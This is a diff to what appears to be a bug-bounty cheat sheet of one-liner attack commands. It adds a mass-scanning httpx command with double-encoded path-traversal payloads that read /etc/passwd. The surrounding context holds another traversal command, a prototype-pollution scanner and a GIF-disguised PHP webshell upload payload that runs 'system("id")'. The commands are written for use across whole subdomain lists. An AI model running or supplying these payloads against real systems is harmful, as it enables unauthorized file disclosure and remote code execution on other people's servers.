@@ -330,7 +330,9 @@ echo "target.com" | waybackurls | httpx -silent -timeout 2 -threads 100 | gf red
 ```bash
 httpx -l url.txt -path "///////../../../../../../etc/passwd" -status-code -mc 200 -ms 'root:'
 ```
-
+```bash
+cat subdomains.txt | assetfinder -subs-only | httpx -silent -p 80,443,8080,8443,9000 -nc -path ".%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/etc/passwd" -mr "root:x" | tee -a p1s.txt
+```
 ### Prototype Pollution
 ```bash
 subfinder -d HOST -all -silent | httpx -silent -threads 300 | anew -q FILE.txt && sed 's/$/\/?__proto__[testparam]=exploit\//' FILE.txt | page-fetch -j 'window.testparam == "exploit"? "[VULNERABLE]" : "[NOT VULNERABLE]"' | sed "s/(//g" | sed "s/)//g" | sed "s/JS //g" | grep "VULNERABLE"
@@ -403,4 +405,4 @@ GIF89a; <?php system("id") ?>
 ...
 
 ```
-5. 
+
